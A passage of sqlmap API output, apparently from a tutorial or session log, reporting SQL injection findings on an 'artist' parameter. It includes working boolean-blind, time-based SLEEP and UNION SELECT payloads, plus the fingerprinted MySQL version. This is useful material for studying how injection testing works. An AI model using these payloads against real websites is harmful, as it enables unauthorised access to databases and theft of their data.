                        "optimize": false
                    }, 
                    "parameter": "artist", 
                    "data": {
                        "1": {
                            "comment": "", 
                            "matchRatio": 0.85, 
                            "trueCode": 200, 
                            "title": "AND boolean-based blind - WHERE or HAVING 
clause", 
                            "templatePayload": null, 
                            "vector": "AND [INFERENCE]", 
                            "falseCode": 200, 
                            "where": 1, 
                            "payload": "artist=1 AND 2794=2794"
                        }, 
                        "5": {
                            "comment": "", 
                            "matchRatio": 0.85, 
                            "trueCode": 200, 
                            "title": "MySQL >= 5.0.12 AND time-based blind", 
                            "templatePayload": null, 
                            "vector": "AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLE
EPTIME]),[RANDNUM])", 
                            "falseCode": null, 
                            "where": 1, 
                            "payload": "artist=1 AND SLEEP([SLEEPTIME])"
                        }, 
                        "6": {
                            "comment": "[GENERIC_SQL_COMMENT]", 
                            "matchRatio": 0.85, 
                            "trueCode": null, 
                            "title": "Generic UNION query (NULL) - 1 to 20 colum
ns", 
                            "templatePayload": null, 
                            "vector": [
                                2, 
                                3, 
                                "[GENERIC_SQL_COMMENT]", 
                                "", 
                                "", 
                                "NULL", 
                                2, 
                                false, 
                                false
                            ], 
                            "falseCode": null, 
                            "where": 2, 
                            "payload": "artist=-5376 UNION ALL SELECT NULL,NULL,
CONCAT(0x716b706a71,0x4a754d495377744d4273616c436b4b6a504164666a5572477241596649
704c68614672644a477474,0x7162717171)-- aAjy"
                        }
                    }
                }
            ]
        }, 
        {
            "status": 1, 
            "type": 2, 
            "value": "5.1.73-0ubuntu0.10.04.1"
        }
    ], 
    "success": true, 
    "error": []
}
api (a42ddaef02e976f0)> exit
$
```
